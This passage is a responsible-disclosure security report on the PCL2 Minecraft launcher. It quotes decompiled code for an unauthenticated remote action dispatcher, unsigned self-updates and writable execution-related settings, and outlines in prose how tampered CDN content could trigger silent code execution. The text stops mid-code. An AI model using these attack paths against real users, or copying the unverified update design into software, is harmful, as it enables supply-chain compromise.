# PCL2 启动器安全评估报告（全量反编译核验版）

> 评估对象：`Plain Craft Launcher 2.exe` v2.13.0.1（VersionCode 406，Release）
> 样本指纹：5,645,824 字节 · SHA-256 `0ab0b28a93cc4d0754a9fa488b5939b5e092f0e5fb3f1e6550cc92a5d3f6577f`
> 评估方式：全量反汇编（ilspycmd）+ 内嵌依赖程序集提取 + 针对性运行时验证
> 前序材料：`安全评估报告_ModSecret.md`（基于作者公开的 186 行源码作静态推断，16 项）
> 配套材料：`漏洞原理教程_ModSecret.md`、`反汇编核验报告_PCL2_2.13.0.1.md`
> 评估日期：2026-10-25
> 材料性质：**善意白帽安全研究，负责任披露材料，非公开指控**
>
> **反编译作者授权：https://www.bilibili.com/opus/1262353478882164752**

---

## 修订记录

| 版本 | 日期 | 变更 |
|---|---|---|
| v1.0 | 2026-10-25 | 首次发布：16 项前序结论逐条判定 + 8 项新增发现 + 实验记录 + 作者说明评价 |
| v1.1 | 2026-10-25 | 依复核结果原地修订 6 处（详见下表），**判定与定级均未改变** |

v1.1 的 6 处修订（均已在正文对应位置改写，不再是"待改"状态）：

| # | 条目 | 修订内容 |
|---|---|---|
| 1 | PCL2-2026-07 | 覆盖面从"两个微软域"收窄为 **仅 `minecraftservices` 一个域**（`xboxlive` 因 IP 改写使 `Address.Host` 变 IP 而恒为 `false`），并补充 `req == null` 的失败开放分支；新增 6.5 节实验为证 |
| 2 | PCL2-2026-01 | `LaunchAdvanceJvm` **不支持远程 URL `-javaagent`**，属二阶段执行，与 `LaunchAdvanceRun` 不在同一量级 |
| 3 | PCL2-2026-02 | 注入位置精确为 **第 0 个 token**（`Argument` 本身），并补充 `-p="{item}"` 引号逃逸这第二个注入点 |
| 4 | PCL-RCE-002 | 补充：`setup` 走 `Set` 而非 `SetSafe`，**绕过"禁止写入加密项"的保护** |
| 5 | PCL2-2026-04 | 补充与 `HintNotice` 的组合，可形成"免 CDN 的长期据点"（危害升级） |
| 6 | PCL-SILENT-001 | `count > 3` 的精确分支是 `switch` 的 `default`（`Logger.Warn` + `continue`），即"该条公告不显示"，而非"整条被丢弃" |

---

## 〇、本报告与前序报告的关系（阅读指引）

前序报告《安全评估报告_ModSecret.md》的分析对象只有作者公开的 186 行 `ModSecret.vb`，其中 `OpenWebsite`、`Settings.Set`、`UpdateStart`、`NetRequestByClientRetry`、`FileUtils.ExtractToDirectory`、`Identify`、`HasUpdatePermission` 等**全部属于"不可见的外部符号"**。前序报告在这些符号上明确标注了"基于调用约定与安全推理"，这是严谨的做法；但也决定了它只能给出**假设条件下的可能性**。

本报告把假设全部替换为事实：`Plain Craft Launcher 2.exe` 无壳、无混淆、保留了 `F:\Projects\Plain Craft Launcher 2\本体代码\...\ModSecret.vb` 等编译期源码路径常量，且以单文件内嵌 13 个 IL 程序集（含 `MeloongCore`、`PCLCS`）的方式发布依赖。**前序报告列为"不可见"的函数，本次全部可见、可读、可逐行核对。**

因此本报告不是"再写一遍漏洞"，而是三件事的合并：

1. 对前序 16 项结论**逐条判定**（成立 / 部分成立 / 不成立 / 降级），不成立项必须写明**为什么不成立**；
2. 记录反汇编**新发现**的 8 项问题，按前序同样的粒度拆解源码结构；
3. 完整记录本次实验的**过程与环境**，并对作者 2026-10-23 的公开说明作出技术评价。

### 0.1 判定分布

| 判定 | 数量 | 编号 |
|---|---|---|
| ✅ 成立 | 7 | PCL-RCE-001、PCL-RCE-003、PCL-SILENT-001、PCL-DL-001、PCL-DOS-001、PCL-PARSE-001、PCL-INFO-002 |
| ⚠️ 部分成立（结论对、机制错） | 4 | PCL-RCE-002、PCL-PARSE-002、PCL-FILE-001、PCL-INFO-003 |
| ❌ 不成立 | 3 | **PCL-INFO-001**、**PCL-MITM-001**、**PCL-CHAIN-001** |
| 🔽 成立但降级 | 2 | PCL-HARD-001、PCL-LOG-001 |
| ➕ 本次新增 | 8 | PCL2-2026-01 ~ 08 |

### 0.2 必须说清楚的一句话

**"不成立"不代表"没有问题"。** 三条被证伪的结论，否定的都是**具体机制**（`?id=` 外发、TLS 被全局禁用、`{CDN}` 可被设置重定向），而不是否定"服务器可远程指挥客户端"这一根因。根因在反汇编中**证据更硬、更明确**：整条链上确实**没有任何内容签名、哈希或证书固定**，而动作分发器确实可以执行 `setup` / `update` / `website` / `stop`。

反过来也一样：承认根因，不等于承认前序报告每一条推断都准确。安全评估的价值在于**把"可能性"收敛为"事实"**，两个方向都算收敛。

---

## 一、概述

### 1.1 对象

`Plain Craft Launcher 2.exe` 是 Minecraft 启动器 PCL2 的 Windows 客户端主体（WPF，VB.NET 编译，目标 .NET Framework 4.8）。它是一个**单文件分发**程序集：除主程序集外，13 个托管依赖（Newtonsoft.Json、NAudio、CacheCow、MeloongCore、PCLCS 等）以资源形式内嵌，运行期由 `AssemblyResolve` 动态加载。

这与前序报告的认知有重要差异：前序报告认为 `FileUtils`、`PCLCS` 等属于"外部库，行为未知"，实际上它们**就在同一个 exe 里**，只是需要先从 PE 资源中剥离。

### 1.2 `ModSecret` 模块的功能（与反汇编一致）

`PCL.ModSecret` 是 VB 标准模块（反编译 1,632 行），其中 `ServerSub` 由后台 `LoaderTask` 周期性调用，负责：

1. 清理历史残留 `PCL\update.exe`（**仅删除，从不执行**——见 3.1.1 中 PCL-RCE-003 的修正）；
2. 读取本地缓存 `Cache\ServerConfig.json`、`Cache\Notice.cfg`；
3. 拉取 `notice.cfg`、`ServerConfig.json`、`notice.json`（域名 `pcl2-server-1253424809.file.myqcloud.com`，路径后缀 `{CDN}`）；
4. 解析公告并按 `actions` **无条件分发执行**：`copy` / `website` / `stop` / `setup` / `update` / `slientupdate`。

### 1.3 本次新增的事实基础（决定了所有结论的精度）

| 事实 | 前序报告状态 | 反汇编结论 |
|---|---|---|
| `{CDN}` 的语义 | 猜测为"可配置域名占位符" | 实为**URL 签名参数** `?sign=ts-rand-0-MD5(path-…)`，不改变主机名 |
| TLS 证书校验 | "可能被 `return true` 禁用" | 默认开启；`HttpClientHandler` 无自定义回调；IP 直连仍按 `Host` 头校验（已实测正/反用例） |
| `Settings.Set` | "无键名白名单" | 有 `Entries` 字典白名单 + `CTypeDynamic` 强转；**但白名单内含执行类设置** |
| 更新落地方式 | "下载并执行 `update.exe`" | **ZIP 覆盖 exe + 重启**；`update.exe` 只删不跑 |
| `update.exe` 校验 | 未知 | 无哈希；`Latest.zip` 仅校验 `MinSize = 1MB` |
| 更新权限门 | "若被置位或绕过" | `HasUpdatePermission => true` **硬编码常量**，门根本不存在 |
| `Identify` 外发 | "极可能以 `?id=` 外发" | **不外发**；唯一上行参数是 `sign` |
| ZIP 解压 | "可能路径穿越" | `PathUtils.IsParentOf` + `GetFullPath` 防护，`..\` 不可绕 |
| `OpenWebsite` | "可能触发 `file://`" | 协议白名单：仅 `http*` / `minecraft://` |

### 1.4 根本问题（修订版）

前序报告的根因判断**成立**，但需要更精确的表述：

> **PCL2 把"服务端内容"当成了"可信代码"来执行。**
> 它没有把远端下发物降级为**数据**（需要 Schema 校验、签名、哈希），而是把它当作**指令**直接送进一个覆盖"写设置 / 改文件 / 开网页 / 起进程 / 替换自身"的动作解释器；而这个解释器的输入，在传输层之外的**内容层**上没有任何鉴别。

三个修饰词是本次反汇编加上去的，也是本报告与作者公开说明分歧的真正所在：

1. **传输层是可信的**（TLS + 主机名校验正常），所以攻击者不能"随便在公网截一刀"；
2. **但内容层是完全空白的**（无签名、无哈希、无固定证书），所以一旦跨过传输层（CDN 写权限、可信证书中间人、本机写权限），就没有第二道门；
3. **而且这个解释器的"权限白名单"是按功能划分的，不是按安全划分的**——`LaunchAdvanceRun`（启动前命令）、`CacheAuthServerServer`（登录服务器地址）这类"本身就是执行/重定向能力"的设置，被合法地放进了 `setup` 可写范围。

---

## 二、综合评级

### 2.1 本次评级

| 项目 | 评级 | 说明 |
|---|---|---|
| **综合风险评级** | **高危（High）** | 影响面为全量客户端；但不等同"任意互联网攻击者可利用" |
| 影响（Impact） | 高 | 一次内容投递可实现供应链级 RCE、凭据窃取、持久化 |
| 可利用性（Exploitability） | 中 | 需 CDN 写权限 / 可信证书中间人 / 本机写权限之一 |
| 后门 / 远程控制 | 高危（能力层面） | 非蓄意后门，但行为等价（见 三-B） |
| 下载与更新安全 | 高危 | 更新链无签名、无哈希、静默可用、直接覆盖 exe |
| 权限边界（动作框架） | 高危 | `setup` 白名单包含执行类与重定向类设置 |
| 凭据保护 | 中危 | DES-CBC 固定 IV + `Identify` 明文入日志 |
| 信息泄露 | 中危（下调） | 设备指纹**不外发**，但落盘泄露成立 |
| 传输安全 | 低危（下调） | 默认校验正常；仅隐藏设置可局部放宽 |
| 解析健壮性 | 中危 | 竖线分隔的位置索引解析、JSON 无 Schema |

### 2.2 与前序评级的对比

| 维度 | 前序报告 | 本报告 | 变化原因 |
|---|---|---|---|
| 综合 | 🔴 高危 | 🔴 高危 | 维持 |
| 可利用性 | 隐含"公网可打" | 明确"需前置条件" | TLS 实测通过 |
| `setup` | 任意键任意类型 | 白名单但含危险键 | 白名单存在，危险点转移 |
| 信息泄露 | 🟠 中危（指纹外发） | 🟡 低—中（仅落盘） | 外发被证伪 |
| 传输 | 🟠 中危（可能禁用） | 🟢 低（默认正常） | 实测否定 |
| 更新 | 🔴 高危（执行 update.exe） | 🔴 高危（覆盖 exe，更直接） | 机制替换，危害不降 |

**评级结论：综合仍为高危。** 理由不是"漏洞更多"，而是"链路更短"：前序报告设想的 `{CDN}` 重定向、TLS 绕过两条路径虽然不存在，但反汇编证明攻击者**根本不需要它们**——`ServerConfig.json` 本身就直白地提供更新 URL，`HasUpdatePermission` 本身就是常量 `true`，更新包本身就是 `MinSize` 校验后直接覆盖 exe。绕的路少了，不是多了。

---

## 三、漏洞清单

> 命名规则沿用前序报告：`PCL-` 前缀 + 漏洞类型编号；本次新增使用 `PCL2-2026-` 前缀以示区分。
> 严重程度：🔴 高危 / 🟠 中危 / 🟡 低危 / ⚪ 信息。
> 判定标记：✅ 成立 / ⚠️ 部分成立 / ❌ 不成立 / 🔽 成立但降级 / ➕ 新增。
> "源代码"栏本次统一使用**反编译得到的 C# 原始输出**（VB 编译后的等价形态），并在必要处标注对应的公开源码行号。

### 3.0 阅读约定

- 反编译输出中的 `(object)` 强转、`IL_xxxx: Unknown result type` 注释、`val` / `text` / `num` 变量名，均为 ILSpy 对 VB 编译器生成 IL 的还原产物，**不是作者手写风格**，但不影响语义判读。
- 引用中出现的 `F:\Projects\Plain Craft Launcher 2\本体代码\...` 是编译期写入的 `CallerFilePath` 常量，可作为"该函数确属该源文件"的强证据。

---

### 3.1 A 组：前序结论逐条复核

#### 3.1.1 ✅ 成立（7 项）

##### PCL-RCE-001 远程代码执行（无约束的服务器动作执行通道）
- **类型**：远程代码执行 / 远程控制（设计信任模型缺陷）
- **核验判定**：✅ **成立**（与公开源码逐字对应）
- **源代码**：
  ```csharp
  // PCL.ModSecret.ServerSub，动作分发核心
  foreach (JProperty item3 in (IEnumerable)obj)          // obj = 公告或按钮的 actions
  {
      JProperty val4 = item3;
      try
      {
          switch (val4.Name)
          {
          case "copy":
              ModBase.ClipboardSet(val4.Value.ToString());
              break;
          case "website":
              ModBase.OpenWebsite(val4.Value.ToString());
              break;
          case "stop":
              ModMain.FrmMain.EndProgram(SendWarning: false);
              break;
          case "setup":
          {
              JObject val5 = (JObject)val4.Value;
              foreach (KeyValuePair<string, JToken> item4 in val5)
              {
                  Settings.Set(item4.Key, item4.Value.ToString());
              }
              break;
          }
          case "update":
          case "slientupdate":
          {
              _ = (JObject)val4.Value;
              bool flag3 = Operators.CompareString(val4.Name, "slientupdate", TextCompare: false) == 0;
              if (!HasUpdatePermission)
              {
                  if (!flag3) InputPotatoCode(IsUpdating: true);
                  if (!HasUpdatePermission) break;
              }
              UpdateStart(flag3);
              break;
          }
          default:
              throw new Exception("未知的行动支：" + val4.Name + ", " + val4.Value.ToString());
          }
      }
      catch (Exception ex15)
      {
          Logger.Error(ex15, $"执行 PCL 服务器公告动作失败（{val4.Name}, {val4.Value}）", (LogBehavior)1, ...);
      }
  }
  ```
- **说明**：前序报告的四点判断（动作集开放、参数透传、异常吞掉、无来源鉴权）全部成立，且本次可以补充两条更硬的证据：
  1. **全程序集唯一的非对称签名校验是"土豆码"**（`CryptographyUtils.EcdsaVerify`），作用域是"官方构建授权"，与公告/配置/更新包**无关**。除此之外不存在任何 `RsaVerify` / `EcdsaVerify` / `VerifyData` 调用点。
  2. **`Case Else` 抛异常后被就地吞掉**，因此未知动作不会中断循环，攻击者可在同一公告内混入多条动作做"冗余投递"。
  需要修正的只有一句：前序报告称"等价于无鉴权命令解释器"——方向正确，但**它的现实入口不是"任意公网请求"**，而是"能改写 `ServerConfig.json` / `notice.json` 的任何一方"（CDN 写权限、可信证书中间人、本机写权限），因为 TLS 校验是正常的（见 3.1.3 PCL-MITM-001）。
- **可能的利用方法**：控制/篡改 CDN 内容或本机缓存 → 下发含 `setup` / `update` / `slientupdate` 的公告 → 客户端自动解析执行，无需用户交互。
- **可能的后果**：全量客户端远程代码执行、远程控制、批量投毒。
- **严重程度**：🔴 高危

##### PCL-RCE-003 不安全的更新机制（update/slientupdate 远程触发下载覆盖）
- **类型**：远程代码执行（不安全更新）
- **核验判定**：✅ **成立，且比原文更严重**（机制需整体替换）
- **源代码**：
  ```csharp
  // ① 权限门是常量
  private static bool HasUpdatePermission => true;

  // ② 更新地址直接来自服务器下发的 ServerConfig
  JObject val = (JObject)ServerConfig["Update"][(object)ModBase.BuildTypes.Release.ToString()];
  if (val.ContainsKey("PatchUrls") && StringExtensions.StartsWithF(UpdateMark, "Empty", false))
      urls = val["PatchUrls"].ToObject<List<string>>();
  else if (val.ContainsKey("DownloadUrls"))
      urls = val["DownloadUrls"].ToObject<List<string>>();
  ...
  Task.Output = new ModNet.NetFile[1] { new ModNet.NetFile(urls, localPath) };   // 未传 FileChecker

  // ③ 落地：删旧 exe → 解压覆盖 / 打补丁 → 重启
  string exePath = Paths.Base + "PCL\\Plain Craft Launcher 2.exe";
  if (FileUtils.Exists(exePath)) FileUtils.Delete(exePath, false);
  if (Extension == ".zip")
      FileUtils.ExtractToDirectory(localPath, Paths.Base + "PCL\\", null);
  else
      MsDelta.Apply(ModBase.PathExe, localPath, Paths.Base + "PCL\\Plain Craft Launcher 2.exe");
  ...
  UpdateRestart(TriggerRestartAndByEnd: true);
  ```
- **说明**：三点结论成立，两点修正：
  - ✅ 更新源由服务器配置决定（`DownloadUrls` / `PatchUrls`），客户端不做域名白名单。
  - ✅ 更新包**无哈希、无签名、无 Authenticode 校验**；`MsDelta.Apply` 打补丁同样不校验补丁来源。
  - ✅ 落地语义是"替换可执行文件并重启"，RCE 判定无疑。
  - ⚠️ **修正一**：`PCL\update.exe` 在本版**只被删除、从未被执行**。全程序集仅 2 处引用，均为 `FileUtils.Delete`。前序报告"update.exe 是更新器执行入口"的推断需整体替换为"ZIP 覆盖 + 重启"。
  - ⚠️ **修正二**：`InputPotatoCode` 在 Release 构建里**连输入框都没有**，只弹一条 Hint（"请使用 PCL 正式版……"）；`GeneratePotatoCode` 为空实现。也就是说这道"权限门"是**双重死代码**：`HasUpdatePermission` 恒 `true`，即使不为真也无处输入土豆码。前序报告"若该权限被置位或绕过"的假设，实际是"恒为真"。
- **可能的利用方法**：篡改 `ServerConfig.Update.Release.DownloadUrls` → 触发 `update` / `slientupdate` → 客户端下载并覆盖自身 exe → 重启后执行。
- **可能的后果**：直接 RCE；恶意代码获得与启动器相同的用户权限，并持久化。
- **严重程度**：🔴 高危

##### PCL-SILENT-001 静默执行危险动作（无 buttons 公告）
- **类型**：远程控制 / 未授权执行
- **核验判定**：✅ **成立**
- **源代码**：
  ```csharp
  JArray val3 = (JArray)(((object)val["buttons"]) ?? ((object)new JArray()));
  int count = ((JContainer)val3).Count;
  if (count > 3) continue;                       // 超过 3 个按钮 → 整条公告跳过
  if (count > 0)
  {
      ...
      num9 = MyMsgBox(...);                      // 有按钮 → 用户选择
      obj = val3[num9 - 1]["actions"] ?? new JArray();
  }
  else
  {
      obj = val["actions"] ?? new JArray();      // 无按钮 → 顶层 actions
  }
  foreach (JProperty item3 in (IEnumerable)obj)  // 直接执行，无确认
  ```
- **说明**：与原文一致。补充一条原文未覆盖的行为：按钮数 `count > 3` 时走 `switch` 的 `default` 分支，`Logger.Warn` 后 `continue`——**该条公告不会被显示**，也不会降级为"取前 3 个按钮"。这意味着"按钮数量膨胀"不构成绕过路径，服务器也无法用"4 按钮公告"做任何事；这是一条对防御方有利的"反制特性"。
- **可能的利用方法**：下发无 `buttons` 公告，顶层 `actions` 静默执行 `website` / `copy` / `stop` / `setup`。
- **可能的后果**：用户无感知地被导向钓鱼页、剪贴板被写入诱导内容、设置被静默篡改、程序被强制退出。
- **严重程度**：🔴 高危

##### PCL-DL-001 下载内容无完整性校验
- **类型**：不安全下载 / 缺少完整性校验
- **核验判定**：✅ **成立**
- **源代码**：
  ```csharp
  text3 = NetRequestByClientRetry("https://pcl2-server-1253424809.file.myqcloud.com/notice.cfg{CDN}");
  NetDownloadByClient("https://pcl2-server-1253424809.file.myqcloud.com/ServerConfig.json{CDN}", LocalConfigPath);
  text5 = NetRequestByClientRetry(".../notice.json{CDN}", null, null, null, null, null, null, RequireJson: true);
  ```
- **说明**：逐资源核对结果：

  | 资源 | 校验方式 | 判定 |
  |---|---|---|
  | `notice.cfg` | 无 | ❌ 未校验 |
  | `ServerConfig.json` | 无（下载后直接 `ReadAsJson`） | ❌ 未校验 |
  | `notice.json` | 仅 `RequireJson`（首字符 `{`/`[`） | ⚠️ 格式校验，非完整性 |
  | `minecraft/download.json`（特供版清单） | 仅 `RequireJson` | ⚠️ 同上 |
  | 更新 ZIP / `MsDelta` 补丁 | 无 | ❌ 未校验 |
  | `Latest.zip` | `FileChecker { MinSize = 1048576 }` | ⚠️ 仅尺寸下限 |
  | `EasyTier.zip`（联机模块） | `FileChecker { MinSize = 2097152 }` | ⚠️ 仅尺寸下限 |
  | 本地缓存 `Cache\ServerConfig.json` | 仅 `Val(ServerConfig["Version"])` | ❌ 未校验 |

  **关键对照（本次新增证据）**：框架层其实**具备**哈希校验能力，`MeloongCore.FileChecker` 会根据 `Hash` 长度自动选择算法：
  ```csharp
  case 32: ... ComputeFileHash(localPath) ...   // 32→MD5，40→SHA1，64→SHA256
  ```
  但公告链与更新链**一律没有传入 `Hash`**。这属于"能力现成、未接线"，是修复成本最低的一类缺陷，也是反驳"行业普遍如此、无法避免"的最直接事实。
- **可能的利用方法**：任何能改写响应的一方替换配置文件/公告/更新包，客户端直接采信。
- **可能的后果**：为 RCE-001/003、PCL2-2026-01/03 提供数据基础。
- **严重程度**：🔴 高危

##### PCL-DOS-001 远程拒绝服务（stop 动作）
- **类型**：拒绝服务
- **核验判定**：✅ **成立（中危偏低）**
- **源代码**：
  ```csharp
  case "stop":
      ModMain.FrmMain.EndProgram(SendWarning: false);
      break;
  ```
- **说明**：`SendWarning = false` 跳过"仍有下载任务"的确认，直接进入退出流程。危害限于可用性；与 PCL-SILENT-001 组合可做到"用户正在操作时被静默关闭"。
- **可能的利用方法**：无按钮公告内混入 `stop`。
- **可能的后果**：启动器被随时强制关闭，可破坏更新回滚或提示。
- **严重程度**：🟠 中危

##### PCL-PARSE-001 基于位置的 `Split("|")` 解析
- **类型**：输入解析脆弱 / 逻辑错误
- **核验判定**：✅ **成立**
- **源代码**：
  ```csharp
  text3 = NetRequestByClientRetry(".../notice.cfg{CDN}");
  num4 = (int)Math.Round(Val(StringExtensions.Split(text3, "|")[0]));   // 公告编号
  num5 = (int)Math.Round(Val(StringExtensions.Split(text3, "|")[3]));   // download.json 编号（原文未覆盖）
  if (num4 == 0) throw new Exception("获取到的内容有误！");
  ...
  double num6 = Val(StringExtensions.Split(text3, "|")[4]);             // 配置版本号
  ```
- **说明**：成立，且字段比原文更多（`[3]` 用于 `download.json` 的编号）。字段不足 5 段时 `[4]` 抛 `IndexOutOfRangeException`，被外层 `catch` 吞掉 → **配置永不更新**；`Val()` 遇首个非数字即停，与原文描述一致。
- **可能的利用方法**：下发段数不足或畸形 `notice.cfg`，使配置更新静默失效；或利用 `Val` 歧义构造被误判为有效的内容。
- **可能的后果**：配置更新被长期阻断（隐蔽失效窗口），便于持续投毒而不被新配置覆盖。
- **严重程度**：🟠 中危

##### PCL-INFO-002 兼容性提示误导（FIPS 文案因果相反）
- **类型**：信息 / 可用性
- **核验判定**：✅ **成立**
- **源代码**：
  ```csharp
  if (ex8 is InvalidOperationException && ex8.Message.Contains("FIPS"))
  {
      MyMsgBox("由于系统未启用 FIPS 兼容算法，PCL 可能无法正常运行。\r\n请按照教程启用该功能，然后重启 PCL。",
               "兼容性警告", "打开教程", "取消", IsWarn: true);
      OpenWebsite("https://blog.csdn.net/qq_37608398/article/details/81209922");
  }
  ```
- **说明**：.NET 的 FIPS 异常文本是 `This implementation is not part of the Windows Platform FIPS validated cryptographic algorithms`，触发条件是系统**已启用** FIPS 策略而所用算法不在白名单内；提示却要求用户"启用该功能"，因果相反。另：该提示把用户导向第三方 CSDN 博客（外部、不可控）。`OpenWebsite` 有协议白名单，故不存在 `file://` 复用风险。
- **可能的利用方法**：无直接利用；属误导性提示。
- **可能的后果**：用户做出错误的系统安全配置（开启 FIPS 可能破坏其它软件加密兼容性）。
- **严重程度**：⚪ 信息

---

#### 3.1.2 ⚠️ 部分成立（4 项：结论对、机制错）

##### PCL-RCE-002 权限提升 / 任意设置篡改（setup 动作）
- **类型**：权限边界缺失 / 配置篡改
- **核验判定**：⚠️ **部分成立——"任意键任意类型"不成立，但风险实质更高**
- **源代码**：
  ```csharp
  // ① Set 有键名白名单
  public static void Set(string Key, object Value, ModMinecraft.McInstance Instance = null)
  {
      Setting value = null;
      if (!Entries.TryGetValue(Key, out value))
          throw new KeyNotFoundException("未找到设置项：" + Key);      // 未注册键 → 异常

      try
      {
          Value = RuntimeHelpers.GetObjectValue(
              Conversion.CTypeDynamic(RuntimeHelpers.GetObjectValue(Value), value.Type));  // 强类型转换
          if (value.GetCache(Instance) == null) Get(Key, Instance);
          if (!Operators.ConditionalCompareObjectEqual(value.GetCache(Instance), Value, TextCompare: false))
          {
              value.Set(RuntimeHelpers.GetObjectValue(Value), Instance);
              value.Save(Instance);                 // 落盘 Setup.ini
              if (value.OnChanged != null) value.OnChanged(RuntimeHelpers.GetObjectValue(Value));
          }
      }
      catch (Exception ex) { Logger.Error(ex, $"设置设置项时出错（{Key}, ...）", ...); }   // 内部吞异常
  }
  ```
- **说明**：
  1. **"无键名白名单"不成立**：`Entries` 是 `Dictionary<string, Setting>`（约 190 项），未注册键直接抛 `KeyNotFoundException`。
  2. **"类型污染"不成立**：`CTypeDynamic` 按声明类型强转，`JObject`/`JArray` 转 `bool`/`int` 会抛异常，不会写进设置存储。
  3. **"可写实例级设置"不成立**：`setup` 以 `Instance = null` 调用，`Version*` 系列在 `GetCache(null)` 处触发 `NullReferenceException`，被内部 `catch` 吞掉。
  4. **但真正的问题被前序报告"猜对了方向、猜错了位置"**：白名单是**功能白名单**而非**安全白名单**。`LaunchAdvanceRun`、`LaunchAdvanceJvm`、`CacheAuthServerServer`、`LoginType`、`SystemSystemCache` 等"本身就是能力"的设置项，全部在 `Entries` 里，因此 `setup` 可以合法写入。风险不是"写任意键"，而是"**被允许写的键里就有执行/重定向能力**"（详见 PCL2-2026-01 / 04）。
  5. 另需注意：`Set` 内部 `try/catch` 吞掉所有异常，因此 `setup` 外层 `catch` 基本不会触发，错误只落日志——攻击者可以做"盲投递"，失败也无外部可观测后果。
  6. **`setup` 绕过了一道已经写好的防护**：框架里存在 `SetSafe`，它对加密设置项做了拦截：
     ```csharp
     public static void SetSafe(string Key, object Value, ...)
     {
         if (value.Encrypted) throw new InvalidOperationException("禁止写入加密设置项：" + Key);
         Set(Key, Value, Instance);
     }
     ```
     但 `ServerSub` 的 `setup` 调的是 `Set`，因此 `CacheMsAccess`、`CacheAuthPass`、`CacheNidePass`、`Potatoes` 等加密项照样可写。这与 `FileChecker`（哈希能力现成但没接线）是同一类问题：**安全能力写在代码里，却没有接入实际路径**。它同时也是"作者知道该拦"的直接证据。
- **可能的利用方法**：`setup` 写入执行类/重定向类设置（见新增项），或覆盖用户已选的公告过滤相关设置。
- **可能的后果**：持久化命令执行、登录凭据重定向、缓存目录可控。
- **严重程度**：🔴 高危（机制修正后仍为高危，但利用点改为"白名单内的危险键"）

##### PCL-PARSE-002 JSON 反序列化类型混淆
- **类型**：不安全反序列化 / 类型混淆
- **核验判定**：⚠️ **部分成立——缺 Schema 成立，失效表现需修正**
- **源代码**：
  ```csharp
  int num7 = (int)Math.Round(Val(val["id"] ?? JToken.op_Implicit(0)));
  int num8 = (int)(val["importantLevel"] ?? JToken.op_Implicit(2));   // JToken 显式转换
  bool flag2 = (bool)(val["isUpdate"] ?? JToken.op_Implicit(false));
  ...
  int num2 = Val(Notice["id"] ?? JToken.op_Implicit(0));
  ```
- **说明**：
  1. ✅ 缺 Schema 校验成立，`Val()` 隐式语义成立。
  2. ⚠️ **失效表现不同**：类型异常（如 `importantLevel: "abc"`）会抛 `FormatException`，被**最外层** `catch` 捕获，后果是 `Logger.Warn(公告原文)` + 删除 `Notice.json` + **整个公告循环中止**，而不是原文说的"逐条静默跳过"。二者的攻防含义不同：前者是"公告系统整体被打断"（一次畸形公告即可阻断后续所有公告），比"逐条跳过"更容易被滥用为"公告压制"。
  3. ⚠️ **`setup` 类型污染不成立**（见 PCL-RCE-002 第 2 点）。
  4. 补充：`notice.json` 解析失败时会**删除本地缓存**，下次启动重新拉取——这使"畸形公告"具备"清空本地公告缓存"的副作用。
- **可能的利用方法**：下发类型异常字段，使整条公告链中断（公告压制）；或利用默认值 `2` 改变重要级判定。
- **可能的后果**：公告/过滤机制被阻断或降级；本地公告缓存被动清空。
- **严重程度**：🟠 中危

##### PCL-FILE-001 不安全临时文件写入
- **类型**：不安全文件操作（竞态 / 符号链接）
- **核验判定**：⚠️ **部分成立——固定路径成立，"任意文件写入"不成立（降级）**
- **源代码**：
  ```csharp
  // 路径固定、可预测
  string LocalConfigPath = PathTemp + "Cache\\ServerConfig.json";
  string NoticeFileAddress = PathTemp + "Cache\\Notice.cfg";
  // ZIP 解压具备穿越防护（MeloongCore.FileUtils）
  if (!PathUtils.IsParentOf(outputDirectory, text2))
      throw new InvalidDataException("Zip 文件项 " + ... + " 的路径在压缩包之外");
  ```
- **说明**：
  1. ✅ 路径固定可预测成立，且 `PathTemp` 可由设置 `SystemSystemCache` 指定（见 PCL2-2026-04）。
  2. ❌ "任意文件写入"的 ZIP-slip 路径不成立：`ExtractToDirectory` 逐项用 `PathUtils.IsParentOf` 校验，`IsParentOf` 基于 `Path.GetFullPath` 规范化后按 `\` 前缀比较，`..\` 无法绕过。
  3. ❌ `--update` 命令行写入任意路径不成立：`UpdateReplace` 只取 `PathUtils.GetLastPart(...)` 并锚定 `Paths.Base`。
  4. ⚠️ 符号链接/junction 攻击仍理论可行，但需**同用户**写权限，不构成权限边界跨越，属"本地已被攻陷后的加固项"，不足以独立定级为中危。
- **可能的利用方法**：同用户条件下预置符号链接，使固定路径写入重定向（需已具备本机写权限）。
- **可能的后果**：配置文件被覆盖/污染；不构成提权。
- **严重程度**：🟡 低危（维持低位，但机制描述需替换）

##### PCL-INFO-003 自复制行为（`Latest.exe` 固化）
- **类型**：供应链（信息）
- **核验判定**：⚠️ **部分成立——自复制成立，但机制已被"服务器 ZIP"取代**
- **源代码**：
  ```csharp
  // ① 自复制（无更新时把自身存为"最新正式版"）
  if (Settings.Get<int>("SystemHighestSavedBetaVersionReg") < 406 || !FileUtils.Exists(PathTemp + "Latest.exe"))
  {
      Settings.Set("SystemHighestSavedBetaVersionReg", 406);
      FileUtils.Copy(ModBase.PathExe, PathTemp + "Latest.exe");
  }

  // ② 从服务器下载 Latest.zip（仅 MinSize 校验）→ 解压 → 取 exe
  NetDownloadByLoader(ServerConfig["Update"]["Release"]["DownloadUrls"], PathTemp + "Latest.zip",
                      Loader, new FileChecker { MinSize = 1048576 });
  FileUtils.ExtractToDirectory(PathTemp + "Latest.zip", PathTemp, null);
  FileUtils.Move(PathTemp + "Plain Craft Launcher 2.exe", PathTemp + "Latest.exe");
  ```
- **说明**：前序报告的"污染版本被固化为官方缓存"结论成立，但**路径已扩展**：`Latest.exe` 现在还可以直接来自服务器下发的 ZIP（仅校验 ≥1MB）。也就是说，即使不做自复制，攻击者也能用 `DownloadUrls` 直接写一个"官方最新版"到固定位置。风险不降反升。
- **可能的利用方法**：在供应链已污染前提下，使"最新正式版"缓存持续为恶意版本；或直接投递伪造 `Latest.zip`。
- **可能的后果**：污染难以通过"重新更新/回滚"清除。
- **严重程度**：⚪ 信息（作为独立漏洞）／但其支撑的更新链为高危

---

#### 3.1.3 ❌ 不成立（3 项：核心假设被二进制否定）

> 本节是本次核验的重点。每项都给出"原文假设 → 二进制事实 → 为什么不成立 → 原文为何会误判"，并明确该判定**不否定**其上游根因。

##### PCL-INFO-001 信息泄露（设备指纹外发）— ❌ 不成立

- **类型**：敏感信息泄露
- **核验判定**：❌ **不成立（核心论断错误）**
- **前序报告的假设**：
  > "结合 PCL2 既有的请求约定（配置/公告请求 URL 通常会追加 `?v=版本号&id=Identify` 之类的查询参数），`Identify` 与 `VersionCode` **极可能以查询参数形式随每一次 HTTPS 请求明文发往服务器**。"

- **二进制事实**：

  **(a) `Identify` 的构成**（与"外发"无关，先确认它是什么）
  ```csharp
  internal static string GetIdentify()
  {
      string lastConfig = MyWpfExtension.Computer.Registry
          .GetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\HardwareConfig", "LastConfig", "Unknown")
